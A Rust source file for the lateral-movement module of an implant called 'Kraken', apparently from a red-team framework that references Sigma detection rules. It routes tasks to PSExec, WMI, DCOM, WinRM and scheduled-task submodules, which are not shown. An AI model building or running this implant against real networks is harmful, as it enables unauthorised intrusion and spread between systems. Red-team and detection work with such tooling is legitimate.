//! mod-lateral: Lateral Movement Module for Kraken implant
//!
//! Provides multiple techniques for moving between systems:
//! - PSExec: SMB + Service creation
//! - WMI: Windows Management Instrumentation
//! - DCOM: Distributed COM objects
//! - WinRM: Windows Remote Management
//! - Scheduled Tasks: Remote task creation
//!
//! Detection rules: wiki/detection/sigma/kraken_lateral_*.yml

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{lateral_task, LateralTask};

pub mod dcom;
pub mod psexec;
pub mod schtask;
pub mod smb;
pub mod winrm;
pub mod wmi;

pub struct LateralModule {
    id: ModuleId,
}

impl LateralModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("lateral"),
        }
    }
}

impl Default for LateralModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for LateralModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Lateral Movement"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: LateralTask =
            LateralTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(lateral_task::Operation::Psexec(ref req)) => {
                let result = psexec::execute(req)?;
                Ok(TaskResult::Lateral(result))
            }
            Some(lateral_task::Operation::Wmi(ref req)) => {
                let result = wmi::execute(req)?;
                Ok(TaskResult::Lateral(result))
            }
            Some(lateral_task::Operation::Dcom(ref req)) => {
                let result = dcom::execute(req)?;
                Ok(TaskResult::Lateral(result))
            }
            Some(lateral_task::Operation::Winrm(ref req)) => {
                let result = winrm::execute(req)?;
                Ok(TaskResult::Lateral(result))
            }
            Some(lateral_task::Operation::Schtask(ref req)) => {
                let result = schtask::execute(req)?;
                Ok(TaskResult::Lateral(result))
            }
            None => Err(KrakenError::Protocol("missing lateral operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(LateralModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = LateralModule::new();
        assert_eq!(module.id().as_str(), "lateral");
        assert_eq!(module.name(), "Lateral Movement");
    }

    #[test]
    fn test_invalid_task_data() {
        let module = LateralModule::new();
        let result = module.handle(TaskId::new(), &[0xFF, 0xFE]);
        assert!(result.is_err());
    }
}
